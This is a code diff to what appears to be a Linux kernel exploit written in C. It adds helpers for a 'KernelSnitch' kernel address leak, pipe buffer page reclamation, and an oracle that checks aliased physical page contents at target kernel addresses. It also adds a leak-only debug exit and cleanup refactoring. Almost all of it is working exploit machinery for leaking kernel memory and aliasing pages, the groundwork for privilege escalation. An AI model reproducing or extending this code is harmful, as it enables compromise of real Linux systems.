@@ -20,6 +20,23 @@ static int pipe_fds_reclaim[PIPE_RECLAIM][2];
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 static int p0_gate_holders[PIPE_RECLAIM][2];
 static int p0_gate_holders_initialized;
+
+static void close_p0_gate_holders(void) {
+  if (!p0_gate_holders_initialized) {
+    return;
+  }
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    if (p0_gate_holders[i][0] >= 0) {
+      close(p0_gate_holders[i][0]);
+    }
+    if (p0_gate_holders[i][1] >= 0) {
+      close(p0_gate_holders[i][1]);
+    }
+    p0_gate_holders[i][0] = -1;
+    p0_gate_holders[i][1] = -1;
+  }
+  p0_gate_holders_initialized = 0;
+}
 #endif
 
 pid_t pipe_prepare_child = -1;
@@ -225,6 +242,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  if (getenv("KS_LEAK_ONLY")) {
+    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
+               leaked, base, (leaked - base) / MM_STRUCT_SZ);
+    fflush(NULL);
+    _exit(0);
+  }
 
   shape_pipe_cache();
 
@@ -330,19 +353,7 @@ void reset_pipe_attempt(void) {
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  if (p0_gate_holders_initialized) {
-    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-      if (p0_gate_holders[i][0] >= 0) {
-        close(p0_gate_holders[i][0]);
-      }
-      if (p0_gate_holders[i][1] >= 0) {
-        close(p0_gate_holders[i][1]);
-      }
-      p0_gate_holders[i][0] = -1;
-      p0_gate_holders[i][1] = -1;
-    }
-    p0_gate_holders_initialized = 0;
-  }
+  close_p0_gate_holders();
 #endif
 
   pipebuf_page_base = 0;
@@ -951,6 +962,7 @@ int verify_p0_pipe_oracle_gate(void) {
   int gate_hits = 0;
   int gate_pipe_index = -1;
   int changed_pages = 0;
+  p0_gate_holders_initialized = 1;
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
                               p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
@@ -1015,9 +1027,51 @@ int verify_p0_pipe_oracle_gate(void) {
     return 1;
   }
   if (gate_hits == 0 && changed_pages == 0) {
+    close_p0_gate_holders();
     return 0;
   }
   return -1;
+}
+
+int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected) {
+  unsigned char page[PAGE_SIZE];
+  size_t target_offset = target & (PAGE_SIZE - 1);
+  int changed_pages = 0;
+  int exact_matches = 0;
+  uint64_t observed = 0;
+
+  if (target_offset + sizeof(observed) > sizeof(page)) {
+    return -1;
+  }
+  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
+                        sizeof(page))) {
+      pr_warning("fops data alias read failed pipe=%zu errno=%d\n",
+                 pipe_index, errno);
+      return -1;
+    }
+    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
+      continue;
+    }
+    changed_pages++;
+    memcpy(&observed, page + target_offset, sizeof(observed));
+    if (observed == expected) {
+      exact_matches++;
+    }
+    pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
+            "observed=%016llx expected=%016llx match=%d\n",
+            pipe_index, target, target_offset,
+            (unsigned long long)observed,
+            (unsigned long long)expected, observed == expected);
+  }
+  pr_info("fops data alias changed=%d exact=%d target=%016zx "
+          "observed=%016llx expected=%016llx\n",
+          changed_pages, exact_matches, target,
+          (unsigned long long)observed, (unsigned long long)expected);
+  if (changed_pages == 1 && exact_matches == 1) {
+    return 1;
+  }
+  return changed_pages == 0 ? 0 : -1;
 }
 
 static int p0_fingerprint_score(
@@ -1083,11 +1137,13 @@ uintptr_t scan_p0_pipe_oracle(void) {
         second_score = score;
       }
     }
-    pr_info("p0 fingerprint pipe=%zu best=%d second=%d slide=%08zx\n",
+    pr_info("p0 fingerprint pipe=%zu best=%d second=%d "
+            "source_offset=%08zx\n",
             pipe_index, best_score, second_score, best_slide);
   }
 
-  pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
+  pr_info("p0 fingerprint changed=%d best=%d second=%d "
+          "source_offset=%08zx\n",
           changed_pages, best_score, second_score, best_slide);
   if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
     return (uintptr_t)-1;
